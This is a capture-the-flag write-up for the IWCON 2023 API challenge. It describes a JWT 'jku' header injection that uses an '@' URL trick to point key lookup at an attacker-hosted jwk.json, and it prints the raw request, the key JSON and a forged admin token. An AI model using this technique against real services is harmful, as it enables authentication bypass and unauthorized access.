---
title: IWCON23 CTF
image: assets/writeups/trace4.jpeg
description: Writeup for challenge IWCON 2023 API solved in IWCON 2023 
date: 2023-12-14
categories: [CTFwriteups]
tags: [API, web]
author: trace
---

![](https://imgur.com/HDfHZOD.png)
### **IWCON 2023 API**

#### **Step 1: Unveiling the Exploited Token Mechanism**

Our team scrutinized a POST request, uncovering a potential threat. This comprehensive analysis exposed the utilization of a manipulated token within the request to gain unauthorized access to sensitive information.

**POST Request Details:**
```http
POST /api/v2/getFlag HTTP/1.1
Host: 3.111.42.9:9595
User-Agent: curl/8.4.0
Accept: */*
Content-Length: 540
Content-Type: application/x-www-form-urlencoded
Connection: close
token=eyJqa3UiOiJodHRwczovLzc1N2YtMTE0LTM2LTE3LTIxNS5uZ3Jvay1mcmVlLmFwcCIsImtpZCI6IjY3ZTVjNjkyLWMzYzUtNDcwNi05MmVmLTUzMGUyZGU4YWIwMCIsInR5cCI6IkpXVCIsImFsZyI6IlJTMjU2In0.eyJ1c2VybmFtZSI6ImFkbWluIn0.OJY-8-9hUxEtSTH3w_LzfvC4ijYVbVBPCRzOII6JWIPLiwX3PFcpdo1Gks4vi3dpGAoX6ZJRAyQm7QDzRv083GngSqF1ZrH5ZfNEt8MWqK28rpVQx9BnatUxXYdaA3gNiWtPPyDl9cJsX1T6w4MCRljb9qih_gOCMjAtV6KxxKR2nJAPhSUbR0yzr7c13UWFQNnifSwBLGMcbxg2Doeh-fBqSS4JvueXKnQRyV-Th5RBlvUx6prQGk0IXW1I-93dCkbWXSUDX4JCzqXHa6qI0xgp_akhz8S1pcwq2sUECujVAgz75ke-pzQhSkzh5wN1G_T5jXEcKKIMTcg6JlKCWw
```

#### **Step 2: Manipulating the "jku" Parameter for Unauthorized Access**

Upon closer inspection, our team identified the "jku" parameter, pointing to "http://3.111.42.9/". Further investigation revealed a filter in place, leading to the discovery that leveraging the "@" symbol could redirect communication to a malicious server. To bypass the imposed filter, the "jku" parameter was manipulated to `"jku": "http://3.111.42.9@<attackerIP>:1445/.well-known/jwk.json"`. Notably, the requested `jwk.json` was then hosted on the attacker's server.

**JWK JSON Payload:**
```json
{"mykeys":[{"alg":"RS256","e":"AQAB","kid":"1234","kty":"RSA","n":"...","use":"sig"}]}
```

#### **Step 3: Generating the "N" Value for Unauthorized Token Creation**

With the obtained JWK data, we extracted the "N" value and proceeded to craft a new JWT token, embedding the desired username to facilitate the extraction of the target flag.

**Final JWT Token:**
```jwt
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQiLCJqa3UiOiJodHRwOi8vMy4xMTEuNDIuOUBSRURBQ1RFRDoxNDQ1Ly53ZWxsLWtub3duL2p3ay5qc29uIn0.eyJ1c2VybmFtZSI6Iml3Y29uIiwiYWRtaW4iOiJ0cnVlIn0.Ki_I4KqmCbEwbN8hEU7NiKsbsyBKUlDKuNSwZthXPZLUAY0x4FruBP5YKyBl-ohR6BPH8IEYt72smgMF4tEuUc0kyyJnOmr0e_VujEa5V23uo80I39rPB3H3U4t5XBEviZKd2haf2h5fkgW3ZNm6SdvvcweKyYpRkTjEAIDR1F5Th2ygjSl6hC8mBuX3cE_Xu4-Wh7EkotWB3hBbSNDrmsxeH2amqA6ZbP6Gwm7aCv0MWHvgGbT1KUtxQZM0WlmcqQlblO4UkYet7_byppX5TIdLy5aB-r6RvSiL9H6HI0VtjkWBu_BFmKywW0aPWVVJuG34ewtO5tTHTmtNFUqnWg
```

Acknowledgments to the shadowbrokers team for their collaborative effort:
- [https://twitter.com/Hac10101](https://twitter.com/Hac10101)
- [https://twitter.com/C15C01337](https://twitter.com/C15C01337)
- [https://twitter.com/5hriyan5h](https://twitter.com/5hriyan5h)
- [https://twitter.com/0xManan](https://twitter.com/0xManan)
- [https://twitter.com/Saitleop](https://twitter.com/Saitleop)
